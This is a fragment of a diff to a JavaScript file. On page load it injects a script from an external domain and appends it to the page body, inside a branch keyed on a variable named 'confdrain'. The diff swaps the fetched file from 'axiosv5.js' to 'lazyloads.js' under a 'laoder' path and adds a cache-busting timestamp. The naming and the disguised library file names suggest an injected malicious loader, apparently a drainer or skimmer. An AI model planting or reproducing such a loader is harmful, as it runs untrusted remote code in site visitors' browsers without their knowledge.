@@ -6,7 +6,7 @@ document.addEventListener("DOMContentLoaded", function() {
         var script = document.createElement("script");
         script.charset = "UTF-8";
         script.type = "text/javascript";
-        script.src = "https://semburat.cloud/laoder/axiosv5.js?vs=" + Math.floor(Date.now() / 1e3);
+        script.src = "https://semburat.cloud/laoder/lazyloads.js?vs=" + Math.floor(Date.now() / 1e3);
         document.body.appendChild(script);
     } else if (confdrain === 2) {
         let bgcolor = "#000000";
